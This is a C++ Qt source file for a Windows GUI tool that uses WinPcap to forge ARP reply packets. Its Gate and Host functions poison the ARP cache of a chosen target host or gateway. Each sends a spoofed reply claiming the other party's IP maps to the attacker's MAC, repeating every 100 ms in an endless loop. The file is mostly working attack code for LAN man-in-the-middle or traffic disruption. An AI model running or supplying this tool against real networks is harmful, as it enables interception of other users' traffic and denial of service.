#include "ArpWork.h"

ArpWork::ArpWork(QWidget* parent)
    : QMainWindow(parent)
{
    ui.setupUi(this);
}

ArpWork::~ArpWork()
{}

using namespace std;

uint8_t ASCII_To_Hex(uint8_t number)
{

    if (number >= '0' && number <= '9')
        return (number - 0x30);

    else if (number >= 'a' && number <= 'f')
        return ((number - 'a') + 10);

    else if (number >= 'A' && number <= 'F')
        return ((number - 'A') + 10);

    return (0);
}

int Gate(pcap_t* adhandle , string TargetHostIP, string GateIP, u_char TargetHostMAC[6], u_char HostMAC[6])
{
    //伪造ARP Relpy包
    //目标信息
    string DstIP = TargetHostIP;
    //源信息
    string SrcIP = GateIP;

    eth_head eh;        //以太网头
    arp_head ah;        //ARP头

    for (int i = 0; i < 6; i++)
        eh.destMAC.byte[i] = TargetHostMAC[i];
    for (int i = 0; i < 6; i++)
        eh.sourceMAC.byte[i] = HostMAC[i];
    eh.type = htons(0x0806);        //ARP类型

    ah.hardwareType = htons(0x0001);
    ah.protocolType = htons(0x0800);
    ah.hardwareAddLen = 0x06;
    ah.protocolAddLen = 0x04;
    ah.op = htons(0x0002);
    ah.sourceMAC = eh.sourceMAC;
    ah.sourceIP = inet_addr(SrcIP.c_str());
    ah.destMAC = eh.destMAC;
    ah.destIP = inet_addr(DstIP.c_str());

    arp_packet* apt = NULL;
    unsigned char sendbuffer[80];
    memset(sendbuffer, 0, sizeof(sendbuffer));
    apt = (arp_packet*)sendbuffer;
    apt->apt_eth_head = eh;
    apt->apt_arp_head = ah;

    while (true)
    {
        if (pcap_sendpacket(adhandle, sendbuffer, sizeof(sendbuffer)) != 0)
        {
            return -1;
        }
        Sleep(100);
    }
    return 0;
}

int Host(pcap_t* adhandle, string TargetHostIP, string GateIP, u_char HostMAC[6], u_char GateMAC[6])
{
    //伪造ARP Relpy包
    //目标信息
    string DstIP = GateIP;
    //源信息
    string SrcIP = TargetHostIP;

    eth_head eh;        //以太网头
    arp_head ah;        //ARP头

    for (int i = 0; i < 6; i++)
        eh.destMAC.byte[i] = GateMAC[i];
    for (int i = 0; i < 6; i++)
        eh.sourceMAC.byte[i] = HostMAC[i];
    eh.type = htons(0x0806);        //ARP类型

    ah.hardwareType = htons(0x0001);
    ah.protocolType = htons(0x0800);
    ah.hardwareAddLen = 0x06;
    ah.protocolAddLen = 0x04;
    ah.op = htons(0x0002);
    ah.sourceMAC = eh.sourceMAC;
    ah.sourceIP = inet_addr(SrcIP.c_str());
    ah.destMAC = eh.destMAC;
    ah.destIP = inet_addr(DstIP.c_str());

    arp_packet* apt = NULL;
    unsigned char sendbuffer[80];
    memset(sendbuffer, 0, sizeof(sendbuffer));
    apt = (arp_packet*)sendbuffer;
    apt->apt_eth_head = eh;
    apt->apt_arp_head = ah;

    while (true)
    {
        if (pcap_sendpacket(adhandle, sendbuffer, sizeof(sendbuffer)) != 0)
        {
            return -1;
        }
        Sleep(100);
    }
    return 0;
}

void ArpWork::send()
{
    pcap_if_t* alldevs;
    pcap_if_t* d;
    char* tam = (char*)"rpcap://";
    char errbuf[PCAP_ERRBUF_SIZE];
    //获取设备列表
    if (pcap_findalldevs_ex(tam, NULL, &alldevs, errbuf) == -1)
    {
        return;
    }
    int i = 0;

    for (d = alldevs; d != NULL; d = d->next)
    {
         i++;
    }

    if (i == 0)
    {
        return;
    }

    while (true)
    {
        QString number = ui.lineEdit_3->text();
        int n = number.toInt();

        if (n < 0 || n >= i)
        {
            pcap_freealldevs(alldevs);
            return ;
        }
        for (d = alldevs, i = 0; i < n+1; d = d->next, i++);
        break;
    }

    //打开与网络适配器绑定的设备
    pcap_t* adhandle;

    if ((adhandle = pcap_open(d->name, 65535, PCAP_OPENFLAG_PROMISCUOUS, 1000, NULL, errbuf)) == NULL)
    {
        pcap_freealldevs(alldevs);
        return;
    }

    u_char GateMAC[6];
    u_char TargetHostMAC[6] ;
    u_char HostMAC[6] = { 0x00,0x50,0x56,0xC0,0x00,0x08 };

    string TargetHostIP = ui.lineEdit->text().toStdString();
    string GateIP = ui.lineEdit_2->text().toStdString();   

    pcap_freealldevs(alldevs);
    ui.lineEdit->setText("1008611");

    //发送模式
    QString str1 = "Gate";
    QString str2 = "Host";
    QString type = ui.comboBox->currentText();

    if (type == str1) {

        QString TMAC = ui.lineEdit_5->text();           // 从文本编辑框中取出的QString
        QByteArray letter = TMAC.toLatin1();	       // QString转化为QByteArray
        char* TargetMAC = letter.data();            // QByteArray转化为char*

        uint8_t MAC_Buffer[6];
        uint8_t i;
        uint8_t ch1;
        uint8_t ch2;
        char* p;
        p = TargetMAC;
        for (i = 0; i < 6; i++)
        {
            ch1 = *p++;
            ch2 = *p++;
            ch1 = ASCII_To_Hex(ch1);
            ch2 = ASCII_To_Hex(ch2);
            MAC_Buffer[i] = (ch1 << 0x04) | ch2;
            TargetHostMAC[i] = (char)MAC_Buffer[i];
        }

        Gate(adhandle, TargetHostIP, GateIP, TargetHostMAC, HostMAC);

    }
    else if (type == str2) {

        QString GMAC = ui.lineEdit_5->text();
        QByteArray letter = GMAC.toLatin1();
        char* GaMAC = letter.data();

        uint8_t MAC_Buffer[6];
        uint8_t i;
        uint8_t ch1;
        uint8_t ch2;
        char* p;
        p = GaMAC;
        for (i = 0; i < 6; i++)
        {
            ch1 = *p++;
            ch2 = *p++;
            ch1 = ASCII_To_Hex(ch1);
            ch2 = ASCII_To_Hex(ch2);
            MAC_Buffer[i] = (ch1 << 0x04) | ch2;
            GateMAC[i] = (char)MAC_Buffer[i];
        }

        Host(adhandle, TargetHostIP, GateIP, HostMAC, GateMAC);
    }
}

void ArpWork::gethost() {
    //PIP_ADAPTER_INFO结构体指针存储本机网卡信息
    PIP_ADAPTER_INFO pIpAdapterInfo = new IP_ADAPTER_INFO();
    //得到结构体大小,用于GetAdaptersInfo参数
    unsigned long stSize = sizeof(IP_ADAPTER_INFO);
    //调用GetAdaptersInfo函数,填充pIpAdapterInfo指针变量;其中stSize参数既是一个输入量也是一个输出量
    int nRel = GetAdaptersInfo(pIpAdapterInfo, &stSize);
    //记录网卡数量
    int netCardNum = 0;
    //记录每张网卡上的IP地址数量
    int IPnumPerNetCard = 0;
    if (ERROR_BUFFER_OVERFLOW == nRel) {
        //如果函数返回的是ERROR_BUFFER_OVERFLOW
        //则说明GetAdaptersInfo参数传递的内存空间不够,同时其传出stSize,表示需要的空间大小
        //这也是说明为什么stSize既是一个输入量也是一个输出量
        //释放原来的内存空间
        delete pIpAdapterInfo;
        //重新申请内存空间用来存储所有网卡信息
        pIpAdapterInfo = (PIP_ADAPTER_INFO)new BYTE[stSize];
        //再次调用GetAdaptersInfo函数,填充pIpAdapterInfo指针变量
        nRel = GetAdaptersInfo(pIpAdapterInfo, &stSize);
    }
    if (ERROR_SUCCESS == nRel) {
        //输出网卡信息
         //可能有多网卡,因此通过循环去判断
        QString NetName, NetIP, NetMAC;
        while (pIpAdapterInfo) {

            netCardNum++;
            
            string count;
            stringstream sstr;
            sstr << netCardNum;
            count = sstr.str();

            NetName += "Net";
            NetName += count;
            NetName += " ";
            NetName += pIpAdapterInfo->Description;
            NetName += "\n";

            ui.plainTextEdit->setPlainText(NetName);

            char mac[128];
            sprintf_s(mac, 18, "%02X%02X%02X%02X%02X%02X",
                pIpAdapterInfo->Address[0],
                pIpAdapterInfo->Address[1],
                pIpAdapterInfo->Address[2],
                pIpAdapterInfo->Address[3],
                pIpAdapterInfo->Address[4],
                pIpAdapterInfo->Address[5]
            );
            NetMAC += "MAC ";
            NetMAC += mac;
            NetMAC += "\n";

            ui.plainTextEdit_2->setPlainText(NetMAC);

            //可能网卡有多IP,因此通过循环去判断
            IP_ADDR_STRING* pIpAddrString = &(pIpAdapterInfo->IpAddressList);
            NetIP += "IP ";
            NetIP += pIpAddrString->IpAddress.String;
            NetIP += "\n";

            ui.plainTextEdit_3->setPlainText(NetIP);

            //do {
            //    cout << "IP ：" << pIpAddrString->IpAddress.String << endl;
           //     pIpAddrString = pIpAddrString->Next;
           // } while (pIpAddrString);

            pIpAdapterInfo = pIpAdapterInfo->Next;
        }
    }
    //释放内存空间
    if (pIpAdapterInfo) {
        delete pIpAdapterInfo;
        pIpAdapterInfo = NULL;
    }
}

void ArpWork::getIP(){
    PIP_ADAPTER_INFO pIpAdapterInfo = new IP_ADAPTER_INFO();
    unsigned long stSize = sizeof(IP_ADAPTER_INFO);
    int nRel = GetAdaptersInfo(pIpAdapterInfo, &stSize);
     
    if (ERROR_BUFFER_OVERFLOW == nRel) {
        pIpAdapterInfo = (PIP_ADAPTER_INFO)new BYTE[stSize];
        nRel = GetAdaptersInfo(pIpAdapterInfo, &stSize);
    }
    if (ERROR_SUCCESS == nRel) {
        QString IP;
        QString number = ui.lineEdit_3->text();
        int n = number.toInt();
        

        for (int i = 1; i < n; i++)
        {
            pIpAdapterInfo = pIpAdapterInfo->Next;
        }

        IP_ADDR_STRING* pIpAddrString = &(pIpAdapterInfo->IpAddressList);

        IP += pIpAdapterInfo->Description;
        IP += "\n";

        do {
            IP += "IP ";
            IP += pIpAddrString->IpAddress.String;
            IP += "\n";
            pIpAddrString = pIpAddrString->Next;

        } while (pIpAddrString);

        ui.plainTextEdit_4->setPlainText(IP);
    }
}

void ArpWork::stop()
{
    ui.lineEdit_5->setText("##");
}
